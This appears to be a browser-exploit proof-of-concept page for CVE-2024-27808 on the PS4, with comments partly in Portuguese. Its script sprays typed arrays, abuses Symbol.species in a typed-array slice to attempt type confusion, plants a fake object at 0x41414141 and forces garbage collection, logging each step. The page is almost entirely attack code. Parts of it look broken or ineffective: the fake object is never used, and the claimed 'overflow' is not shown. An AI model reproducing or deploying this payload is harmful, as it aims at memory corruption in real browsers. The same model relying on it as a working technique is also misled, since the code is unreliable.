<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - CVE-2024-27808 - Full PS4 Test (Visual Logs)</title>
    <style>
        body { font-family: monospace; background: black; color: lime; padding: 20px; }
        #log { white-space: pre-wrap; }
    </style>
</head>
<body>
<h1>PoC - CVE-2024-27808 - Full Exploit Attempt (PS4)</h1>
<div id="log"></div>

<script>
function log(msg) {
    document.getElementById('log').textContent += msg + "\n";
}

(async function(){
    try {
        log("[+] Starting full test...");

        // Spray inicial de arrays normais
        log("[1] Spraying Uint32Arrays...");
        let spray = [];
        for (let i = 0; i < 5000; i++) {
            spray.push(new Uint32Array(20));
        }

        function forceGC() {
            log("[2] Forcing garbage collection...");
            for (let i = 0; i < 100; i++) {
                let tmp = new ArrayBuffer(0x1000000);
            }
        }

        log("[3] Preparing Symbol.species attack...");
        let evil = new Uint32Array(1);
        evil.constructor = {
            [Symbol.species]: function() {
                log("[*] Symbol.species triggered.");
                return new Float64Array(100); // Tipo trocado
            }
        };

        log("[4] Executing slice...");
        let corrupted = evil.slice(0, 10); // slice com overflow sutil

        log("[5] Slice result: length=" + corrupted.length);

        if (corrupted.length !== 1) {
            log("[!!] Unexpected object length: " + corrupted.length);
        } else {
            log("[OK] Slice returned expected size.");
        }

        log("[6] Attempting Fake Object Spray...");

        let fake_obj = {
            fake: true,
            addr: 0x41414141,
            spray: spray
        };

        log("[7] Spray size: " + spray.length);

        forceGC();

        log("[8] Test finished without direct crashes detected.");

    } catch (e) {
        log("[!!] Exception captured: " + e);
    }
})();
</script>

</body>
</html>
